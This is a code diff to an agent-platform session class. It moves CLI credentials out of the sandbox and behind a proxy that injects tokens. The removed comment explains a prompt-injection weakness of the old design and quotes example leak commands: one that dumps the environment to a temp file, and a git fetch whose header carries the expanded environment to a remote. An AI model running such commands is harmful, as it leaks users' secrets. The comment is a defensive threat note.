@@ -2218,50 +2218,39 @@ export class SessionDO extends DurableObject<Env> {
         }
       }
 
-      // Register command_secret credentials from vaults.
-      //
-      // SECURITY MODEL — known limitation worth understanding:
-      //
-      // Unlike outbound HTTPS credentials (mcp_oauth / static_bearer)
-      // which are now resolved live in main worker via the MAIN_MCP RPC
-      // and never touch the sandbox, `command_secret` credentials are
-      // injected into the sandbox container's per-command process env.
-      // The agent worker holds the plaintext token in
-      // `state.vault_credentials` and `registerCommandSecrets` stashes
-      // it in the sandbox SDK's in-memory map (not in a persistent
-      // container env var — `env | grep TOKEN` from the sandbox shell
-      // returns nothing).
-      //
-      // The injection only fires when the model executes a single
-      // simple command whose binary name exactly matches the registered
-      // prefix (sandbox.ts:getSimpleCommandName parses the AST). Shell
-      // composition (`&&`, `;`, `|`, redirects) blocks injection — the
-      // model gets a hint to retry as a single command. This stops
-      // casual `git status && env > /tmp/leak` exfiltration.
-      //
-      // What this DOESN'T stop: targeted prompt-injection that crafts
-      // single-command-form leak vectors specific to the binary, e.g.
-      //   git fetch -c http.extraHeader="x-leak: $(env)"
-      // Shell expands `$(env)` in the registered exec context (which
-      // has the secret in env), then git sends the captured env as a
-      // header to the upstream remote. Per-binary mitigation would
-      // need an allowlist of safe arg shapes.
-      //
-      // Until we move command_secret to the same out-of-sandbox proxy
-      // pattern as MCP/outbound (sandbox runs the command, agent worker
-      // reverse-RPCs to main when the binary asks for the credential
-      // via stdin/file rather than env), DO NOT attach high-blast-radius
-      // tokens (org-wide GitHub PAT, prod database creds, etc.) to
-      // agents that handle untrusted input. Use scoped repo tokens, etc.
+      // CLI auth lives in main worker via cap_cli credentials — sandbox
+      // outbound handler RPCs to MAIN_MCP.lookupOutboundCredential on
+      // every HTTPS request, main resolves cap spec + token, injects
+      // Bearer at proxy. Sandbox never holds plaintext token in env or
+      // memory. Sentinel env vars (e.g. GITHUB_TOKEN=__cap_managed__) are
+      // set here from the cap spec's bootstrap.env so CLIs that refuse to
+      // dial out without a token-shaped env value still try; the proxy
+      // replaces the sentinel-bearing Authorization header at HTTPS time.
       const vaultIds = this.state.vault_ids;
-      if (vaultIds.length && sandbox.registerCommandSecrets) {
-        const creds = await this.getVaultCredentials(vaultIds);
-        for (const cred of creds) {
-          if (cred.auth?.type === "command_secret" && cred.auth.command_prefixes?.length && cred.auth.env_var && cred.auth.token) {
-            for (const prefix of cred.auth.command_prefixes) {
-              sandbox.registerCommandSecrets(prefix, { [cred.auth.env_var]: cred.auth.token });
+      if (vaultIds.length && sandbox.setEnvVars) {
+        try {
+          const { builtinSpecs, createSpecRegistry } = await import("@open-managed-agents/cap");
+          const registry = createSpecRegistry(builtinSpecs);
+          const sentinelEnv: Record<string, string> = {};
+          const creds = await this.getVaultCredentials(vaultIds);
+          for (const cred of creds) {
+            if (cred.auth?.type !== "cap_cli" || !cred.auth.cli_id) continue;
+            const spec = registry.byCliId(cred.auth.cli_id);
+            if (!spec?.bootstrap?.env) continue;
+            for (const [k, v] of Object.entries(spec.bootstrap.env)) {
+              // First cap_cli for a given env var wins. Sentinels are
+              // identical across credentials anyway (all `__cap_managed__`),
+              // so collisions are no-op in practice.
+              if (!(k in sentinelEnv)) sentinelEnv[k] = v;
             }
           }
+          if (Object.keys(sentinelEnv).length > 0) {
+            await sandbox.setEnvVars(sentinelEnv);
+          }
+        } catch (err) {
+          console.error(
+            `[session-do] cap sentinel env injection failed (continuing without): ${(err as Error).message}`,
+          );
         }
       }
 
